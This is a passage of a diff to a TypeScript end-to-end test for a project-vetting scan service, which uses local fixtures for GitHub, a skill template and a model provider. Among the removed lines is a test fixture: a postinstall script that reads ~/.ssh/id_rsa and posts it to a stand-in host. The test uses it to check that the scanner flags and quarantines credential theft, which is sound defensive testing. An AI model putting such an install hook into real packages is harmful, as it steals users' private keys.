@@ -1,113 +1,103 @@
-// The bounded-scan service end to end (PRD section 8, release proof in
-// section 11; issue #909). One service cycle runs the real signed refresh,
-// queue, exact Git acquisition, inspection, Surplus Messages transport,
-// evidence retention in local workerd R2 and journaled publication against
-// the real handlers and migrations. GitHub, the skill template and Surplus
-// are local synthetic servers with harmless fixtures. No real provider,
-// key, project or network is contacted.
+// The bounded scan service end to end (PRD section 8; issue #909): one
+// pass refreshes the queue, acquires the exact Git and template bytes,
+// inspects them, runs the Surplus primary review and, only for an ambiguous
+// result, the Surplus specialist, retains the evidence and publishes once.
+// Every route is a real handler on the real migrations with local workerd
+// R2. The Git API, GitHub identity and Surplus provider are local fixtures
+// that answer exactly as those services do; no real provider or key is used.
 import { afterEach, beforeEach, expect, test } from "bun:test";
 import { spawnSync } from "node:child_process";
+import { createHash } from "node:crypto";
 import { readdirSync } from "node:fs";
 import { mkdir, mkdtemp, readdir, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { CloudflareProjectPersistence } from "../backend/projects/cloudflare-persistence";
 import { handleProjectApi } from "../backend/projects/handler";
-import { flaggerAuthority } from "../backend/projects/setup";
-import { githubFlaggerStanding } from "../backend/vetting/flagger-standing";
-import {
-  handleProjectFlagsApi,
-  ProjectFlagStore,
-} from "../backend/vetting/flags";
 import {
   handleVettingApi,
-  queueAutomaticScan,
   signedVettingRequest,
 } from "../backend/vetting/handler";
 import { CloudflareVettingPersistence } from "../backend/vetting/persistence";
-import { isScanResult } from "../backend/vetting/scan-result";
 import { applicationManifest } from "../tests/project-application-manifest";
 import { sqliteD1 } from "../tests/sqlite-d1";
 import { localVettingEvidence } from "../tests/vetting-evidence-fixture";
+import { runScanPass, type ScanServiceConfig } from "../workers/vetting/run";
 import {
-  importServiceSigner,
-  runScanCycle,
-  SCAN_PRIMARY_MODEL,
-  SCAN_SPECIALIST_MODEL,
-  type ScanServiceDependencies,
-  surplusScanProfiles,
-} from "../workers/vetting/scan-service";
-import { SCAN_REVIEW_AREAS } from "../workers/vetting/scanners";
+  SCAN_REVIEW_AREAS,
+  type ScannerProfile,
+} from "../workers/vetting/scanners";
 
 const ORIGIN = "https://slop.cash";
 const NOW = new Date("2026-10-18T12:00:00.000Z");
-const ADMIN = { githubId: "900000001", githubLogin: "e2e-admin" };
 const APPLICANT = { githubId: "900000002", githubLogin: "e2e-applicant" };
-const MODERATOR = { githubId: "900000004", githubLogin: "e2e-moderator" };
-const ALICE = { githubId: "900000010", githubLogin: "alice" };
-const BOB = { githubId: "900000011", githubLogin: "bob" };
-const ACTORS: Record<string, { githubId: string; githubLogin: string }> = {
-  admin: ADMIN,
-  applicant: APPLICANT,
-  alice: ALICE,
-  bob: BOB,
-};
-const SURPLUS_KEY = "local-synthetic-surplus-key";
-const sha256 = (value: string | Uint8Array) =>
-  new Bun.CryptoHasher("sha256").update(value).digest("hex");
-
-// The skill template the queue binds (served as the site and GitHub would).
-const templateText = "Follow the project rules and run its tests.\n";
+const ADMIN = { githubId: "900000001", githubLogin: "e2e-admin" };
+const digest = (value: string | Uint8Array) =>
+  createHash("sha256").update(value).digest("hex");
+const templateText = "Follow the project rules and run the tests.\n";
 const rendererText = "export const render = (value) => value;\n";
 const templateInputs = {
   contributor: {
     sourcePath: "skills/contributor",
-    files: [{ path: "SKILL.md", sha256: sha256(templateText) }],
+    files: [{ path: "SKILL.md", sha256: digest(templateText) }],
   },
   reviewer: {
     sourcePath: "skills/reviewer",
-    files: [{ path: "SKILL.md", sha256: sha256(templateText) }],
+    files: [{ path: "SKILL.md", sha256: digest(templateText) }],
   },
-  rendererSources: [{ path: "src/render.mjs", sha256: sha256(rendererText) }],
+  rendererSources: [{ path: "src/render.mjs", sha256: digest(rendererText) }],
   acceptedRevisions: ["1"],
 };
-const TEMPLATE = sha256(JSON.stringify(templateInputs));
-const TEMPLATE_COMMIT = "c".repeat(40);
+const TEMPLATE = digest(JSON.stringify(templateInputs));
+const REPOSITORY_FILES: Record<string, string> = {
+  "README.md": "# Fixture\nRun `bun test`.\n",
+  "AGENTS.md": "Keep changes small and run the tests.\n",
+  "package.json": JSON.stringify({
+    name: "fixture",
+    scripts: { test: "bun test" },
+  }),
+  "bun.lock": '{"lockfileVersion":1}',
+  "src/index.ts": "export const parse = (value: string) => value.trim();\n",
+};
 
 let root: string;
-let repository: string;
-let clock: Date;
-let ids = 0;
-let head: string;
-let sqlite: ReturnType<typeof sqliteD1>["sqlite"];
+let commitSha: string;
+let gitObjects: Map<string, { type: string; body: Buffer }>;
+let treeEntries: { path: string; mode: string; type: string; sha: string }[];
+let treeSha: string;
+let retained: Awaited<ReturnType<typeof localVettingEvidence>>;
 let projects: CloudflareProjectPersistence;
 let vetting: CloudflareVettingPersistence;
-let flags: ProjectFlagStore;
-let retained: Awaited<ReturnType<typeof localVettingEvidence>>;
-let service: ScanServiceDependencies;
-let servicePublicKey: string;
-/** What each scan model answers; a test replaces it for risky content. */
-let verdicts: Record<
-  string,
-  "no-findings" | "findings" | "malicious-suspected"
->;
-const modelCalls: { model: string; authorization: string | null }[] = [];
+let server: ReturnType<typeof Bun.serve>;
+let config: ScanServiceConfig;
+let resultPublicKeys: string;
+let ids = 0;
+/** What the synthetic Surplus provider answers on each transport. */
+let provider: {
+  up: boolean;
+  specialistUp: boolean;
+  primary: "no-findings" | "findings";
+  calls: { path: string; model: string; authorization: string | null }[];
+};
 
-function git(...args: string[]) {
+const git = (cwd: string, ...args: string[]) => {
   const output = spawnSync("git", ["-c", "core.hooksPath=/dev/null", ...args], {
-    cwd: repository,
+    cwd,
   });
   if (output.status !== 0) throw new Error(output.stderr.toString());
-  return output.stdout.toString().trim();
-}
+  return output.stdout;
+};
 
-async function commit(files: Record<string, string>, message: string) {
-  for (const [path, text] of Object.entries(files)) {
+async function gitFixture() {
+  const repository = join(root, "git");
+  for (const [path, text] of Object.entries(REPOSITORY_FILES)) {
     await mkdir(join(repository, path, ".."), { recursive: true });
     await writeFile(join(repository, path), text);
   }
-  git("add", ".");
+  git(repository, "init", "-q");
+  git(repository, "add", ".");
   git(
+    repository,
     "-c",
     "user.name=Fixture",
     "-c",
@@ -115,145 +105,121 @@ async function commit(files: Record<string, string>, message: string) {
     "commit",
     "--no-gpg-sign",
     "-qm",
-    message,
+    "Harmless fixture",
   );
-  head = git("rev-parse", "HEAD");
+  commitSha = git(repository, "rev-parse", "HEAD").toString().trim();
+  treeSha = git(repository, "rev-parse", "HEAD^{tree}").toString().trim();
+  treeEntries = git(repository, "ls-tree", "-r", "-t", "HEAD")
+    .toString()
+    .trim()
+    .split("\n")
+    .map((line) => {
+      const [meta, path] = line.split("\t");
+      const [mode, type, sha] = meta.split(" ");
+      return { path, mode, type, sha };
+    });
+  gitObjects = new Map(
+    treeEntries
+      .filter((entry) => entry.type === "blob")
+      .map((entry) => [
+        entry.sha,
+        {
+          type: "blob",
+          body: git(repository, "cat-file", "blob", entry.sha),
+        },
+      ]),
+  );
 }
 
-/** The GitHub REST reads acquisition and flag eligibility make. */
-function github(url: URL): Response {
-  const path = url.pathname;
-  if (path === "/repos/example/open-registry")
-    return Response.json({
-      id: 123456789,
-      node_id: "R_example",
-      full_name: "example/open-registry",
-      private: false,
-    });
-  const object =
-    /^\/repos\/example\/open-registry\/git\/(commits|trees|blobs)\/([0-9a-f]{40})$/u.exec(
-      path,
-    );
-  if (object?.[1] === "commits")
-    return Response.json({
-      sha: object[2],
-      tree: { sha: git("rev-parse", `${object[2]}^{tree}`) },
-    });
-  if (object?.[1] === "trees")
-    return Response.json({
-      sha: object[2],
-      truncated: false,
-      tree: git("ls-tree", "-r", "-t", object[2])
-        .split("\n")
-        .filter(Boolean)
-        .map((line) => {
-          const [meta, entryPath] = line.split("\t");
-          const [mode, type, sha] = meta.split(" ");
-          return { path: entryPath, mode, type, sha };
-        }),
-    });
-  if (object?.[1] === "blobs") {
-    const bytes = spawnSync("git", ["cat-file", "blob", object[2]], {
-      cwd: repository,
-    }).stdout;
-    return Response.json({
-      sha: object[2],
-      encoding: "base64",
-      size: bytes.length,
-      content: bytes.toString("base64"),
-    });
-  }
-  const user = /^\/user\/([0-9]+)$/u.exec(path)?.[1];
-  const actor = Object.values(ACTORS).find((entry) => entry.githubId === user);
-  if (actor)
-    return Response.json({
-      id: Number(actor.githubId),
-      login: actor.githubLogin,
-      node_id: `U_${actor.githubId}`,
-      type: "User",
-      created_at: "2020-01-01T00:00:00Z",
-    });
-  if (/^\/repos\/[^/]+\/[^/]+\/issues$/u.test(path)) {
-    const creator = Object.values(ACTORS).find(
-      (entry) => entry.githubLogin === url.searchParams.get("creator"),
-    );
-    return Response.json(
-      Array.from({ length: creator ? 2 : 0 }, (_, index) => ({
-        number: index + 1,
-        user: { id: Number(creator?.githubId) },
-        pull_request: { merged_at: "2026-09-01T00:00:00Z" },
-      })),
-    );
-  }
-  return new Response(null, { status: 404 });
-}
-
-/** Surplus's Anthropic Messages wire, answering by the requested model. */
-async function surplus(request: Request): Promise<Response> {
-  const body = (await request.json()) as {
-    model: string;
-    messages: { content: string }[];
-  };
-  modelCalls.push({
-    model: body.model,
-    authorization: request.headers.get("authorization"),
-  });
-  const items = JSON.parse(body.messages[0].content).items as { id: string }[];
-  const verdict = verdicts[body.model];
-  const risky = items.find((item) => item.id === "scripts/postinstall.js");
-  const review = {
+function review(items: { id: string }[], verdict: string) {
+  return JSON.stringify({
     verdict,
     confidence: 0.9,
     coverage: Object.fromEntries(
       SCAN_REVIEW_AREAS.map((area) => [area, "complete"]),
     ),
     findings:
-      verdict === "no-findings"
-        ? []
-        : [
+      verdict === "findings"
+        ? [
             {
-              severity: verdict === "malicious-suspected" ? "critical" : "high",
-              summary: "The install hook reads an SSH key and posts it out.",
-              evidenceIds: [risky?.id ?? items[0].id],
+              severity: "medium",
+              summary: "Synthetic finding that needs a second opinion",
+              evidenceIds: [items[0].id],
             },
-          ],
-  };
-  return Response.json({
-    id: `msg_${modelCalls.length}`,
-    model: body.model,
-    stop_reason: "end_turn",
-    content: [{ type: "text", text: JSON.stringify(review) }],
-    usage: { input_tokens: 40, output_tokens: 20 },
+          ]
+        : [],
   });
 }
 
-const actorOf = (request: Request) =>
-  ACTORS[request.headers.get("x-test-actor") ?? ""] ?? null;
+/** Answers like Surplus: Anthropic Messages and OpenAI Responses. */
+async function surplus(request: Request, path: string): Promise<Response> {
+  const body = (await request.json()) as {
+    model: string;
+    messages?: { content: string }[];
+    input?: string;
+  };
+  provider.calls.push({
+    path,
+    model: body.model,
+    authorization: request.headers.get("authorization"),
+  });
+  if (
+    !provider.up ||
+    (!provider.specialistUp && path === "/openai/v1/responses")
+  )
+    return new Response("unavailable", { status: 503 });
+  const usage = {
+    input_tokens: 8,
+    cache_read_input_tokens: 0,
+    cache_creation_input_tokens: 0,
+    output_tokens: 5,
+  };
+  if (path === "/anthropic/v1/messages") {
+    const items = JSON.parse(body.messages?.[0].content ?? "{}").items;
+    return Response.json({
+      id: "msg_fixture",
+      model: body.model,
+      stop_reason: "end_turn",
+      content: [{ type: "text", text: review(items, provider.primary) }],
+      usage,
+    });
+  }
+  const items = JSON.parse(body.input ?? "{}").items;
+  return Response.json({
+    id: "resp_fixture",
+    model: body.model,
+    status: "completed",
+    error: null,
+    incomplete_details: null,
+    output: [
+      {
+        type: "message",
+        role: "assistant",
+        content: [{ type: "output_text", text: review(items, "no-findings") }],
+      },
+    ],
+    usage: {
+      input_tokens: 8,
+      input_tokens_details: { cached_tokens: 0 },
+      output_tokens: 5,
+    },
+  });
+}
+
+const readLivePin = async () => ({ commitSha, templateSha256: TEMPLATE });
 const randomId = () =>
   `00000000-0000-4000-8000-${String(++ids).padStart(12, "0")}`;
-const livePin = async () => ({ commitSha: head, templateSha256: TEMPLATE });
-const vettingDeps = () => ({
-  evidence: retained.evidence,
-  vetting,
-  flags,
-  projects,
-  resultPublicKeys: servicePublicKey,
-  operatorGithubIds: [ADMIN.githubId, MODERATOR.githubId],
-  livePin,
-  session: async (value: Request) => {
-    const actor = actorOf(value);
-    return actor && { ...actor, admin: actor === ADMIN };
-  },
-  now: () => clock,
-  randomId,
-});
+const actorOf = (request: Request) =>
+  ({ applicant: APPLICANT, admin: ADMIN })[
+    request.headers.get("x-test-actor") ?? ""
+  ] ?? null;
 
 function projectApi(request: Request) {
   return handleProjectApi(request, {
     persistence: projects,
     adminGithubIds: new Set([ADMIN.githubId]),
-    moderatorGithubIds: new Set([MODERATOR.githubId]),
-    now: () => clock,
+    moderatorGithubIds: new Set([ADMIN.githubId]),
+    now: () => NOW,
     randomId,
     sessionActor: async (value) => actorOf(value),
     repositoryControl: async () => ({ state: "matched", reason: "fixture" }),
@@ -272,467 +238,290 @@ function projectApi(request: Request) {
         projectId,
         manifest,
         through,
-        livePin,
+        readLivePin,
         forReinstatement,
       ),
   }) as Promise<Response>;
 }
 
-const flagApi = (request: Request) =>
-  handleProjectFlagsApi(request, {
-    flags,
-    projects,
-    sessionActor: async (value) => actorOf(value),
-    flaggerStanding: githubFlaggerStanding({
-      fetch: async (url: string) => github(new URL(url)),
-      apiOrigin: "https://api.github.test",
-      registryRepositories: async () =>
-        (await projects.listProjects()).flatMap((entry) =>
-          entry.manifest.repositories.map((item) => item.id),
-        ),
-    }),
-    repositoryAuthority: async (manifest, actor) =>
-      flaggerAuthority(
-        {
-          state: "read",
-          access: {
-            installation: "installed",
-            installationId: 1,
-            permission: "read",
-            roleName: null,
-          },
-        },
-        actor,
-        manifest.repositories[0].id,
-      ),
-    moderatorGithubIds: [ADMIN.githubId, MODERATOR.githubId],
-    queueFreshScan: (project) =>
-      queueAutomaticScan(
-        vettingDeps(),
-        project,
-        "Automatic fresh scan after two contributor flags paused the project",
-      ),
-    now: () => clock,
-    randomId,
-  }) as Promise<Response>;
-
-/**
- * The only network the service has: Slop's API and site, GitHub's REST
- * API, the template commit on raw.githubusercontent.com and Surplus.
- */
-const network = (async (input: string | URL | Request, init?: RequestInit) => {
-  const request = new Request(input, init);
-  const url = new URL(request.url);
-  if (url.origin === ORIGIN) {
-    if (url.pathname === "/skill-templates/index.json")
+async function route(incoming: Request): Promise<Response> {
+  const url = new URL(incoming.url);
+  const host = incoming.headers.get("x-fixture-host");
+  const path = url.pathname;
+  if (host === "api.surplusintelligence.ai") return surplus(incoming, path);
+  if (host === "raw.githubusercontent.com")
+    return path.endsWith("/src/render.mjs")
+      ? new Response(rendererText)
+      : new Response(null, { status: 404 });
+  if (host === "api.github.com") {
+    if (path === "/repos/example/open-registry")
       return Response.json({
-        schemaVersion: "1",
-        repository: "SlopDotCash/slopdotcash",
-        commit: TEMPLATE_COMMIT,
-        templateSha256: TEMPLATE,
-        revisionStatus: "committed",
-        contributor: templateInputs.contributor,
-        reviewer: templateInputs.reviewer,
-        renderer: {
-          sources: templateInputs.rendererSources,
-          revisionStatus: "committed",
-        },
-        acceptedRevisions: templateInputs.acceptedRevisions,
+        id: 123456789,
+        node_id: "R_example",
+        full_name: "example/open-registry",
+        private: false,
       });
-    if (url.pathname.startsWith("/skill-templates/"))
-      return new Response(templateText);
+    const git = /^\/repos\/example\/open-registry\/git\/(.+)$/u.exec(path)?.[1];
+    if (git === `commits/${commitSha}`)
+      return Response.json({ sha: commitSha, tree: { sha: treeSha } });
+    if (git === `trees/${treeSha}`)
+      return Response.json({
+        sha: treeSha,
+        truncated: false,
+        tree: treeEntries,
+      });
+    const blob = git?.startsWith("blobs/")
+      ? gitObjects.get(git.slice(6))
+      : undefined;
+    if (blob && git)
+      return Response.json({
+        sha: git.slice(6),
+        encoding: "base64",
+        size: blob.body.length,
+        content: blob.body.toString("base64"),
+      });
+    return new Response(null, { status: 404 });
+  }
+  const request = new Request(`${ORIGIN}${path}${url.search}`, incoming);
+  if (path === "/skill-templates/index.json")
+    return Response.json({
+      schemaVersion: "1",
+      repository: "example/templates",
+      commit: commitSha,
+      templateSha256: TEMPLATE,
+      revisionStatus: "committed",
+      contributor: templateInputs.contributor,
+      reviewer: templateInputs.reviewer,
+      renderer: {
+        sources: templateInputs.rendererSources,
+        revisionStatus: "committed",
+      },
+      acceptedRevisions: templateInputs.acceptedRevisions,
+    });
+  if (path.startsWith("/skill-templates/")) return new Response(templateText);
+  if (path.startsWith("/api/v1/vetting/evidence/"))
     return (
       (await retained.evidence.handle(request)) ??
-      (await handleVettingApi(request, vettingDeps())) ??
-      (await projectApi(request)) ??
       new Response(null, { status: 404 })
     );
-  }
-  if (url.origin === "https://api.github.com") return github(url);
-  if (
-    url.href ===
-    `https://raw.githubusercontent.com/SlopDotCash/slopdotcash/${TEMPLATE_COMMIT}/src/render.mjs`
-  )
-    return new Response(rendererText);
-  if (url.href === "https://api.surplusintelligence.ai/anthropic/v1/messages")
-    return surplus(request);
-  throw new Error(`unexpected network request to ${url.origin}`);
-}) as typeof fetch;
+  if (path.startsWith("/api/v1/vetting/"))
+    return (
+      (await handleVettingApi(request, {
+        evidence: retained.evidence,
+        vetting,
+        projects,
+        resultPublicKeys,
+        livePin: readLivePin,
+        session: async () => null,
+        now: () => NOW,
+        randomId,
+      })) ?? new Response(null, { status: 404 })
+    );
+  return (await projectApi(request)) ?? new Response(null, { status: 404 });
+}
+
+const profile = (
+  transport: ScannerProfile["transport"],
+  reviewer: ScannerProfile["reviewer"],
+  model: string,
+): ScannerProfile => ({
+  reviewer,
+  transport,
+  endpoint:
+    transport === "anthropic-messages"
+      ? "https://api.surplusintelligence.ai/anthropic/v1/messages"
+      : "https://api.surplusintelligence.ai/openai/v1/responses",
+  model,
+  apiKey: "fixture-surplus-key",
+  maxOutputTokens: 1024,
+  rateCard: {
+    uncachedInputNanoUsdPerToken: "3",
+    cachedInputNanoUsdPerToken: "1",
+    cacheCreationNanoUsdPerToken: "4",
+    outputNanoUsdPerToken: "9",
+  },
+});
 
 beforeEach(async () => {
-  clock = NOW;
-  modelCalls.length = 0;
-  verdicts = {
-    [SCAN_PRIMARY_MODEL]: "no-findings",
-    [SCAN_SPECIALIST_MODEL]: "no-findings",
-  };
   root = await mkdtemp(join(tmpdir(), "slop-scan-service-"));
-  repository = join(root, "repository");
-  await mkdir(repository);
-  await mkdir(join(root, "work"));
-  await mkdir(join(root, "journal"));
-  git("init", "-q");
-  await commit(
-    {
-      "README.md": "# Open registry\nRun `bun test` before a pull request.\n",
-      "package.json": JSON.stringify({
-        name: "open-registry",
-        scripts: { test: "bun test" },
-      }),
-      "bun.lock": '{"lockfileVersion":1}',
-      "src/registry.ts":
-        "export const register = (name: string) => name.trim();\n",
-      "AGENTS.md": "Keep changes small and run the tests.\n",
-    },
-    "Harmless registry",
-  );
+  await gitFixture();
   const database = sqliteD1(
     readdirSync(new URL("../migrations", import.meta.url))
       .filter((name) => name.endsWith(".sql"))
       .sort(),
   );
-  sqlite = database.sqlite;
   projects = new CloudflareProjectPersistence(database.db);
-  flags = new ProjectFlagStore(database.db);
+  retained = await localVettingEvidence(database.db, () => NOW);
   vetting = new CloudflareVettingPersistence(
     database.db,
     async (a) => a.result !== null && retained.evidence.retained(a.result),
   );
-  retained = await localVettingEvidence(database.db, () => clock);
   const pair = (await crypto.subtle.generateKey({ name: "Ed25519" }, true, [
     "sign",
     "verify",
   ])) as CryptoKeyPair;
-  servicePublicKey = Buffer.from(
+  resultPublicKeys = Buffer.from(
     await crypto.subtle.exportKey("raw", pair.publicKey),
   ).toString("base64");
-  // The evidence store trusts the same configured service key.
+  // The evidence store verifies this service's own key.
   retained.evidence.deps.signed = (request, maximum) =>
     signedVettingRequest(
       request,
-      { resultPublicKeys: servicePublicKey, now: () => clock },
+      { resultPublicKeys, now: () => NOW },
       maximum,
     );
-  service = {
-    origin: ORIGIN,
-    // The operator supplies the key as PKCS #8, as the command reads it.
-    signer: await importServiceSigner(
-      Buffer.from(
-        await crypto.subtle.exportKey("pkcs8", pair.privateKey),
-      ).toString("base64"),
-    ),
-    ...surplusScanProfiles({
-      apiKey: SURPLUS_KEY,
-      maxOutputTokens: 4096,
-      rateCards: {
-        primary: {
-          uncachedInputNanoUsdPerToken: "5000",
-          cachedInputNanoUsdPerToken: "500",
-          cacheCreationNanoUsdPerToken: "6250",
-          outputNanoUsdPerToken: "25000",
-        },
-        specialist: {
-          uncachedInputNanoUsdPerToken: "3000",
-          cachedInputNanoUsdPerToken: "300",
-          cacheCreationNanoUsdPerToken: "0",
-          outputNanoUsdPerToken: "15000",
-        },
-      },
-    }),
-    policyVersion: "slop-bounded-scan-1",
+  provider = {
+    up: true,
+    specialistUp: true,
+    primary: "no-findings",
+    calls: [],
+  };
+  server = Bun.serve({ port: 0, fetch: route });
+  config = {
+    connection: {
+      origin: ORIGIN,
+      ...pair,
+      now: () => NOW,
+      fetch: ((input: string | URL | Request, init?: RequestInit) => {
+        const url = new URL(String(input));
+        return fetch(
+          `http://localhost:${server.port}${url.pathname}${url.search}`,
+          {
+            ...init,
+            headers: { ...(init?.headers ?? {}), "x-fixture-host": url.host },
+          },
+        );
+      }) as typeof fetch,
+    },
+    primary: profile("anthropic-messages", "opus", "claude-opus-5.5"),
+    specialist: profile("openai-responses", "astra", "gpt-6.1-sol"),
+    policyVersion: "scan-policy-1",
     workDirectory: join(root, "work"),
     journalDirectory: join(root, "journal"),
-    fetch: network,
-    now: () => clock,
+    randomId,
   };
+  const created = await projectApi(
+    new Request(`${ORIGIN}/api/v1/projects`, {
+      method: "POST",
+      headers: {
+        "x-test-actor": "applicant",
+        "content-type": "application/json",
+        origin: ORIGIN,
+      },
+      body: JSON.stringify({
+        manifest: applicationManifest("open-registry", "example/open-registry"),
+      }),
+    }),
+  );
+  expect(created.status).toBe(201);
 });
 afterEach(async () => {
+  server.stop(true);
   await retained?.dispose();
   await rm(root, { recursive: true, force: true });
 });
 
-function sessionRequest(
-  method: string,
-  path: string,
-  actor: string,
-  body?: unknown,
-) {
-  return new Request(`${ORIGIN}/api/v1/${path}`, {
-    method,
-    headers: {
-      "x-test-actor": actor,
-      ...(body === undefined
-        ? {}
-        : { "content-type": "application/json", origin: ORIGIN }),
-    },
-    body: body === undefined ? undefined : JSON.stringify(body),
-  });
-}
-
-async function listPausedProject() {
-  const created = await projectApi(
-    sessionRequest("POST", "projects", "applicant", {
-      manifest: applicationManifest("open-registry", "example/open-registry"),
-    }),
-  );
-  expect(created.status).toBe(201);
-}
-
 async function activate() {
   const project = await projects.getProject("open-registry");
   return projectApi(
-    sessionRequest("PUT", "admin/projects/open-registry/manifest", "admin", {
-      manifest: { ...project?.manifest, status: "active" },
-      expectedRevision: project?.revision,
-      reason: "Activate the scanned revision",
-    }),
-  );
-}
-
-const publicVetting = async () =>
-  (
-    await (
-      await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`))
-    ).json()
-  ).vetting;
-
-const flag = (actor: string) =>
-  flagApi(
-    sessionRequest("POST", "project-flags/open-registry", actor, {
-      category: "credential-theft",
-      evidence:
-        "scripts/postinstall.js reads ~/.ssh/id_rsa and posts it to a remote host",
-      evidenceUrl:
-        "https://github.com/example/open-registry/blob/main/scripts/postinstall.js",
-    }),
-  );
-
-async function retainedKinds(assessmentId: string) {
-  return sqlite
-    .query(
-      "SELECT kind, label FROM vetting_evidence_objects WHERE assessment_id = ? ORDER BY kind, label",
-    )
-    .all(assessmentId);
-}
-
-test("self-service setup: one service cycle scans a listed project clean, and the owner can activate it", async () => {
-  await listPausedProject();
-  expect((await activate()).status).toBe(422);
-
-  const [outcome] = await runScanCycle(service);
-  expect(outcome).toMatchObject({
-    stage: "published",
-    disposition: "clean",
-    specialistReviewed: false,
-    evidence: "retained",
-    publication: "accepted",
-  });
-  // An ordinary clean project needs only the primary Opus 5.5 review.
-  expect(modelCalls).toEqual([
-    { model: SCAN_PRIMARY_MODEL, authorization: `Bearer ${SURPLUS_KEY}` },
-  ]);
-  const assessment = await vetting.getAssessment(outcome.assessmentId);
-  expect(assessment).toMatchObject({
-    state: "clean",
-    commitSha: head,
-    templateSha256: TEMPLATE,
-    requestReason: "Automatic scan of new project content",
-  });
-  const result = assessment?.result;
-  if (!result || !isScanResult(result)) throw new Error("no bounded result");
-  expect(result.primaryReview).toMatchObject({
-    provider: "surplus",
-    model: SCAN_PRIMARY_MODEL,
-    verdict: "no-findings",
-    risk: "low",
-  });
-  expect(
-    Object.values(result.coverage).map((surface) => surface.state),
-  ).toEqual(Array(6).fill("complete"));
-  // The skill template is part of the scanned agent instructions.
-  expect(result.coverage.agentInstructions.items).toBeGreaterThanOrEqual(4);
-  expect(await retainedKinds(outcome.assessmentId)).toEqual([
-    { kind: "artifact", label: "dependency lock bun.lock" },
-    { kind: "manifest", label: "bounded scan inventory" },
-    { kind: "trace", label: "bounded scan report" },
-  ]);
-  expect((await publicVetting()).state).toBe("cleared");
-  expect((await activate()).status).toBe(200);
-  expect((await projects.getProject("open-registry"))?.status).toBe("active");
-  // The acquisition directory is removed; the journal keeps one receipt.
-  expect(await readdir(join(root, "work"))).toEqual([]);
-  expect(await readdir(join(root, "journal"))).toEqual([outcome.assessmentId]);
-
-  // Nothing changed, so the next cycle queues and scans nothing.
-  expect(await runScanCycle(service)).toEqual([]);
-});
-
-test("malicious-code detection: risky new content is flagged, escalated to the specialist and kept quarantined", async () => {
-  await listPausedProject();
-  await runScanCycle(service);
-  expect((await activate()).status).toBe(200);
-
-  // A new integration-branch commit adds an install hook that steals a key.
-  await commit(
-    {
-      "package.json": JSON.stringify({
-        name: "open-registry",
-        scripts: {
-          test: "bun test",
-          postinstall: "node scripts/postinstall.js",
-        },
+    new Request(`${ORIGIN}/api/v1/admin/projects/open-registry/manifest`, {
+      method: "PUT",
+      headers: {
+        "x-test-actor": "admin",
+        "content-type": "application/json",
+        origin: ORIGIN,
+      },
+      body: JSON.stringify({
+        manifest: { ...project?.manifest, status: "active" },
+        expectedRevision: project?.revision,
+        reason: "Activate the scanned revision",
       }),
-      "scripts/postinstall.js":
-        "const key = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\nfetch('https://collector.invalid', { method: 'POST', body: key });\n",
-    },
-    "Add install hook",
-  );
-  expect((await publicVetting()).state).toBe("stale");
-  verdicts = {
-    [SCAN_PRIMARY_MODEL]: "malicious-suspected",
-    [SCAN_SPECIALIST_MODEL]: "findings",
-  };
-  modelCalls.length = 0;
-  clock = new Date(NOW.getTime() + 60_000);
-  const [outcome] = await runScanCycle(service);
-  expect(outcome).toMatchObject({
-    stage: "published",
-    disposition: "incomplete",
-    specialistReviewed: true,
-    evidence: "retained",
-    publication: "accepted",
-  });
-  // GPT-6.1 Sol runs only because the primary review was high risk.
-  expect(modelCalls.map((call) => call.model)).toEqual([
-    SCAN_PRIMARY_MODEL,
-    SCAN_SPECIALIST_MODEL,
-  ]);
-  const assessment = await vetting.getAssessment(outcome.assessmentId);
-  const result = assessment?.result;
-  if (!result || !isScanResult(result)) throw new Error("no bounded result");
-  expect(assessment?.state).toBe("incomplete");
-  expect(result.checks["credential-theft"]).toBe("flagged");
-  expect(result.primaryReview.risk).toBe("high");
-  expect(result.specialistReview).toMatchObject({
-    provider: "surplus",
-    model: SCAN_SPECIALIST_MODEL,
-    verdict: "findings",
-  });
-  // A model label alone never bans: a moderator confirms malice.
-  expect(result.confirmation).toBeNull();
-  expect((await publicVetting()).state).toBe("quarantined");
-  expect(await retainedKinds(outcome.assessmentId)).toContainEqual({
-    kind: "trace",
-    label: "bounded scan report",
-  });
-});
-
-test("a two-flag pause is reinstated automatically after the service's clean fresh scan", async () => {
-  await listPausedProject();
-  await runScanCycle(service);
-  expect((await activate()).status).toBe(200);
-
-  expect((await flag("alice")).status).toBe(201);
-  clock = new Date(NOW.getTime() + 60_000);
-  expect(await (await flag("bob")).json()).toMatchObject({
-    paused: true,
-    pausedByFlags: true,
-    freshScan: "queued",
-  });
-  expect(
-    (await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`)))
-      .status,
-  ).toBe(410);
-
-  clock = new Date(NOW.getTime() + 120_000);
-  const outcomes = await runScanCycle(service);
-  expect(outcomes).toEqual([
-    expect.objectContaining({ stage: "published", disposition: "clean" }),
-  ]);
-  const record = (await projects.listEnforcements())
-    .filter((entry) => entry.projectId === "open-registry")
-    .at(-1);
-  expect(record).toMatchObject({
-    action: "reinstate",
-    stateAfter: "clear",
-    actorRole: "vetting-service",
-    systemIssuer: {
-      rule: "clean-fresh-scan-after-flags",
-      assessmentId: outcomes[0].assessmentId,
-    },
-  });
-  expect(
-    (await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`)))
-      .status,
-  ).toBe(200);
-  expect(await flags.activeFlags(clock)).toEqual([]);
-});
-
-test("a publication the journal already reserved is never retried blindly", async () => {
-  await listPausedProject();
-  const pending = await (async () => {
-    // Queue the scan, then reserve its publication as a lost attempt would.
-    const refreshed = await runScanCycle({
-      ...service,
-      journalDirectory: join(root, "journal"),
-      fetch: (async (input: string | URL | Request, init?: RequestInit) => {
-        const url = new URL(new Request(input, init).url);
-        if (url.pathname === "/api/v1/vetting/results")
-          throw new Error("synthetic lost connection");
-        return network(input, init);
-      }) as typeof fetch,
-    });
-    return refreshed[0];
-  })();
-  expect(pending).toMatchObject({
-    stage: "publication-failed",
-    publication: "unknown",
-  });
-  expect((await vetting.getAssessment(pending.assessmentId))?.state).toBe(
-    "pending",
-  );
-  modelCalls.length = 0;
-  expect(await runScanCycle(service)).toEqual([
-    expect.objectContaining({
-      assessmentId: pending.assessmentId,
-      stage: "journaled-earlier",
     }),
-  ]);
-  // The reserved assessment is not scanned or sent again.
-  expect(modelCalls).toEqual([]);
-});
-
-test("a clean result is never published without its retained evidence; the next cycle retries", async () => {
-  await listPausedProject();
-  const evidenceDown = (async (
-    input: string | URL | Request,
